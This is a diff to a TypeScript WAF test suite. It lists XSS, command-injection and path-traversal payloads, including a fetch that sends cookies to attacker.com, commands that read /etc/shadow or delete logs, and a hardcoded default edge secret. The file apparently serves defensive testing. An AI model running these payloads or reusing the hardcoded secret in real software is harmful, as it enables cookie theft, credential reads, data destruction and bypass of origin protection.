@@ -79,7 +79,7 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
       '<script>alert("XSS")</script>',
       '<img src=x onerror="document.cookie=\\"stolen\\"" />',
       'javascript:fetch("//attacker.com/"+document.cookie)',
-      '<body onload=eval(atob("..."))>',
+      '<body onload=alert(document.domain)>',
     ];
 
     for (const payload of xssPayloads) {
@@ -106,7 +106,7 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
       '; cat /etc/passwd',
       '&& cat /etc/shadow',
       '|| whoami',
-      'uid=501(rikardoribeiro) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),706(com.apple.sharepoint.group.6),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)',
+      '$( id )',
       '; rm -rf /var/log',
     ];
 
@@ -132,7 +132,7 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
   try {
     const traversalPayloads = [
       '../../../../etc/passwd',
-      '..\..\boot.ini',
+      '..\\..\\boot.ini',
       'document.pdf%00.exe',
       '/var/www/uploads/../../../etc/shadow',
     ];
@@ -314,6 +314,7 @@ export function runEdgeSecurityAndWafTests(): { passed: number; failed: number; 
     assert(!directReq.valid, 'Acesso direto sem token de borda deve ser rejeitado');
     assert(directReq.statusCode === 403, 'Acesso direto deve retornar 403');
     delete process.env.ENFORCE_ORIGIN_CLOAK;
+    OriginCloakProtection.setExpectedSecret('LEGIS_ENTERPRISE_EDGE_DEFAULT_SECRET_2026');
 
     console.log('  ✓ Teste 9/12: Origin Cloak Protection & Anti-Bypass Validation');
     passed++;
